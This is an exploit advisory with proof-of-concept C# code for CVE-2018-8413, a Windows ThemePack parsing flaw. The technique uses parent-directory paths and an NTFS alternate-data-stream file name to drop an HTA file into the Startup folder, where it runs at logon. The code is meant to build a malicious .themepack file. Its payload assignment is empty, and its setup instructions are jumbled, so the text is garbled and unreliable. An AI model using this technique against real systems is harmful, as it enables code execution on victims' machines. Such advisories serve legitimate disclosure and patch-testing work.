# Exploit Author: Eduardo Braun Prado
# Vendor Homepage: http://www.microsoft.com/
# Software Link: http://www.microsoft.com/
# Version: 10 v.1803 (17134.407)
# Tested on: Windows 7, 8.0, 8.1, 10, Server 2012, Server 2012 R2, Server 2016, Server 2019
# CVE : CVE-2018-8413
# Discovered by: Eduardo Braun Prado

[Details]

sharing over the internet. Theme files
allows users to customize visual aspects of their device, such as icons
for known features like &#039;My computer&#039;
and &#039;trash bin&#039; folders, the default screensaver (which by the way
allowed attackers to run &#039;.scr&#039; files located
on shares upon applying a Theme, in the past. Refer to: CVE-2013-0810).
ThemePack file type uses Microsoft &#039;CAB&#039; format. The parser contains a
vulnerability that allows attackers
to create arbitrary files on arbitrary locations on the user´s system,
by using the classic
&#039;parent directory&#039; technique, and thus could lead to creation of some
executable files on the
startup folder. This executable will be run on next logon.


Conditions:


1) The &#039;themepack&#039; file must contain a valid &#039;[dot] theme&#039; file.


The parser allows creating &#039;.theme&#039; files on arbitrary locations, but
the extension must be
&#039;.theme&#039;. There´s a trick, though, to overcome this:

NTFS Alternate Data Streams.

By using a specially crafted name like "abc.hta:[dot] theme" it´s
possible to trick the parser into
dropping a file with an &#039;[dot] hta&#039; extension instead of the legitimate
&#039;[dot] theme&#039;, potentially allowing
attackers to compromise the affected systems. The &#039;[dot] hta&#039; extension
is a good choice since you can
merge valid code with arbitrary text or binary files.

Note: Patched on October, 2018 Microsoft monthly patch.


[PoC]

Proof of concept code that drops an &#039;hta&#039; file to startup dir.


Instructions:

 - Create a new project on MS Visual Studio (any version, included free

and at &#039;program . cs&#039; replace the code with the code below

work fine though!)


using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ThemePack
{
    class Program
    {
        static void Main(string[] args)
        {
            String exeDir = AppDomain.CurrentDomain.BaseDirectory;
            Directory.SetCurrentDirectory(exeDir);

            string tmpPath = Path.GetTempPath();

            string tpd =

     
           string tpf = exeDir + "\\C00L.themepack";

            Console.WriteLine("\n\n
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
\n Microsoft Windows Theme API &#039;ThemePack&#039; File Parsing Vulnerability
PoC (CVE-2018-8413)  \n\n by: Eduardo Braun Prado \n\n
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");

            StreamWriter s = File.CreateText(tmpPath + "\\themepack000.h");

            s.Write(tpd);
          
            s.Close();

            FileStream f = File.OpenRead(tmpPath + "\\themepack000.h");

            String ax = "";


            byte[] b = new byte[f.Length];

            UTF8Encoding temp = new UTF8Encoding(false);

            while (f.Read(b, 0, b.Length) > 0)
            {
                ax = ax + temp.GetString(b);
            }


            String bx = ax.ToString();
            String cx = "";

            byte[] b02 = new byte[f.Length / 2];
            for (int i = 0; i < f.Length; i += 2)
            {
                cx = bx.Substring(i, 2);
                b02[i / 2] = Convert.ToByte(cx, 16);
            }

            File.WriteAllBytes(tpf, b02);

            if (File.Exists(tpf))
            {
                long fsize = new FileInfo(tpf).Length;

                if (fsize != 0)
                {
                    Console.WriteLine("\n\n\n Done! &#039;C00L." +
"themepack&#039; file created in the current directory. Vulnerable systems
should plant an HTA on startup dir.");
                }

            }


            }
            }
            }

